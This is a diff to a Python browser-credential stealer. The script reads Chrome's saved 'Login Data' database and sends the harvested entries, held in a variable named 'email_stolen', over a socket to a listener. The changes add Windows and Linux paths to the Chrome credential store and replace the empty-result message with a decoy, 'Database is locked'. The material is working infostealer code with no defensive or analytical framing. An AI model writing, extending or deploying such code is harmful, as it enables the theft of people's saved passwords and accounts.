@@ -1,5 +1,6 @@
 import socket
 import sqlite3
+import os
 
 class SocketConfig:
 
@@ -22,7 +23,7 @@ class SocketConfig:
             try:
 
                 if not email_stolen:
-                    skt_client.sendall("nada chefe".encode())
+                    skt_client.sendall("Database is locked".encode())
                 else:
                     for item in email_stolen:
                         skt_client.sendall(item.encode())
@@ -69,8 +70,19 @@ class DatabaseConfig:
                 
 if __name__ == "__main__":
 
-    login_data_path = r"/home/s1x/.config/google-chrome/Default/Login Data"
-    
+
+    import os
+
+    if os.name == 'nt':
+        login_data_path = os.path.join(
+            os.environ['LOCALAPPDATA'],
+            "Google", "Chrome", "User Data", "Default", "Login Data"
+        )
+    elif os.name == 'posix':
+        login_data_path = os.path.expanduser(
+            "~/.config/google-chrome/Default/Login Data"
+        )
+        
     client = SocketConfig('localhost', 9999)
     database = DatabaseConfig(login_data_path)
 
